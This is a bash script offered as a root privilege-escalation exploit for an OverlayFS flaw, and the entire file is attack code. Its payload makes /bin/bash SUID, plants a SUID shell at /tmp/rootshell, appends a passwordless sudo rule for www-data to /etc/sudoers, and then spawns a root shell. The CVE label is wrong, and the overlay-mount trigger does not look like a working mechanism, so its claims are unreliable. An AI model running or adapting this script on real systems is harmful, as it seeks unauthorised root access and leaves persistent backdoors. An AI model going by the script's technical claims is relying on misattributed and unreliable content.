#!/bin/bash
echo "[+] CVE-2021-3490 OverlayFS Exploit"
echo "[+] Starting privilege escalation..."

# Cleanup function
cleanup() {
    echo "[+] Cleaning up..."
    umount ./ovlcap/merge 2>/dev/null
    rm -rf ./ovlcap 2>/dev/null
}

# Set cleanup on exit
trap cleanup EXIT

# Create directory structure
echo "[+] Setting up directories..."
rm -rf ./ovlcap
mkdir -p ./ovlcap/{work,lower,upper,merge}

# Check if we can create directories
if [ ! -d "./ovlcap" ]; then
    echo "[-] Failed to create directories"
    exit 1
fi

# Create the payload script
echo "[+] Creating payload..."
cat > ./ovlcap/lower/payload << 'EOF'
#!/bin/sh
echo "[+] Payload executed as root!"
id
whoami
# Make bash SUID root
chmod 4755 /bin/bash 2>/dev/null
# Alternative: create a SUID shell copy
cp /bin/bash /tmp/rootshell 2>/dev/null
chmod 4755 /tmp/rootshell 2>/dev/null
# Another alternative: add to sudoers
echo "www-data ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers 2>/dev/null
# Get root shell
/bin/bash -c "bash -p" 2>/dev/null
EOF

chmod +x ./ovlcap/lower/payload

# Check if mount command exists
if ! command -v mount &> /dev/null; then
    echo "[-] mount command not found"
    exit 1
fi

# Attempt to mount overlayfs
echo "[+] Mounting overlayfs..."
mount -t overlay overlay -o lowerdir=./ovlcap/lower,upperdir=./ovlcap/upper,workdir=./ovlcap/work ./ovlcap/merge 2>/dev/null

if [ $? -ne 0 ]; then
    echo "[-] OverlayFS mount failed. Trying alternative method..."
    # Alternative: use unshare if available
    if command -v unshare &> /dev/null; then
        echo "[+] Trying with unshare..."
        unshare -m bash -c "mount -t overlay overlay -o lowerdir=./ovlcap/lower,upperdir=./ovlcap/upper,workdir=./ovlcap/work ./ovlcap/merge 2>/dev/null && ls -la ./ovlcap/merge/payload 2>/dev/null"
    fi
fi

# Trigger the vulnerability by accessing the file
echo "[+] Triggering vulnerability..."
ls -la ./ovlcap/merge/payload 2>/dev/null
./ovlcap/merge/payload 2>/dev/null

# Check for success
echo "[+] Checking for success..."
if [ -u /bin/bash ]; then
    echo "[+] SUCCESS! /bin/bash is now SUID root!"
    echo "[+] Spawning root shell..."
    /bin/bash -p
elif [ -u /tmp/rootshell ]; then
    echo "[+] SUCCESS! /tmp/rootshell is SUID root!"
    echo "[+] Spawning root shell..."
    /tmp/rootshell -p
else
    # Check if we got sudo access
    sudo -l 2>/dev/null | grep -q "NOPASSWD" && {
        echo "[+] SUCCESS! Got passwordless sudo!"
        echo "[+] Spawning root shell..."
        sudo bash
    } || {
        echo "[-] Exploit failed. Checking system info for alternative approaches..."
        uname -a
        cat /etc/os-release 2>/dev/null
        echo "[+] Try manual exploitation:"
        echo "    mount -t overlay overlay -o lowerdir=./ovlcap/lower,upperdir=./ovlcap/upper,workdir=./ovlcap/work ./ovlcap/merge"
        echo "    ls -la ./ovlcap/merge/payload"
    }
fi

# Final cleanup
cleanup